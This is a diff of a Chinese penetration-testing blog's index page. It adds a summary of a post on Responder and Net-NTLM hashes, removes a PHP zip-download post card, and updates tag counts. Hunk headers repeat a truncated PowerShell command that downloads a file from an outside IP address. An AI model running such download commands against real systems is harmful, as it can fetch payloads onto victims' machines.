@@ -66,6 +66,67 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="https://wyb0.com/posts/2018/responder-and-ntlm-hash/">内网渗透之 Responder 与 Net-NTLM hash</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 5px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>
+                    2018-09-10
+                </time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 一些概念  Windows 认证协议
+分为：基于 NTLM 的认证和基于 kerberos 的认证
+ 什么是 NTLM Hash？
+早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash
+ 什么是 Challenge-Response 挑战/响应验证机制？
+ Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证  NTLM Hash 与 Net-NTLM Hash
+    </p>
+
+    
+    <footer>
+        <a href="/posts/2018/responder-and-ntlm-hash/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="https://wyb0.com/posts/2018/injection-tips-of-sqlserver/">SQL注入tips(SQL Server)</a></h2>
 
         
@@ -603,62 +664,6 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="https://wyb0.com/posts/2018/package-and-download-the-php-file/">打包下载php文件</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 5px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>
-                    2018-01-08
-                </time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/php">PHP</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/php">php</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 代码如下 &lt;?php function addFileToZip($zip,$zipname,$path){ $handler = opendir($path); while(($filename = readdir($handler))!==false) { if($filename != &quot;.&quot; &amp;&amp; $filename != &quot;..&quot; &amp;&amp; $filename!= $zipname){ if (is_dir($path.&quot;/&quot;.$filename)) { //如果读取的某个对象是文件夹，则递归 addFileToZip($zip,$zipname,$path.&quot;/&quot;.$filename); } else { $zip-&gt;addFile($path.&quot;/&quot;.$filename); } } } @closedir($path); } function tar($zipname,$path) { $zip = new ZipArchive(); //使用本类，linux需开启zlib，windows需取消php_zip.dll前的注释 if ($zip-&gt;open($zipname, ZipArchive::OVERWRITE) === TRUE) { addFileToZip($zip,$zipname,$path);$zip-&gt;close(); } else { exit('Unable to open file, or file creation failed!'); } } function download($zipname) { if(!file_exists($zipname)){ exit(&quot;Zip file does not exist!
-    </p>
-
-    
-    <footer>
-        <a href="/posts/2018/package-and-download-the-php-file/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -716,7 +721,7 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
+                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(83)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -1033,7 +1038,7 @@ powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.1
         
             <p style="display:inline-block;">
                 <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
-                <sup>1</sup>
+                <sup>2</sup>
             </p>
         
     </div>
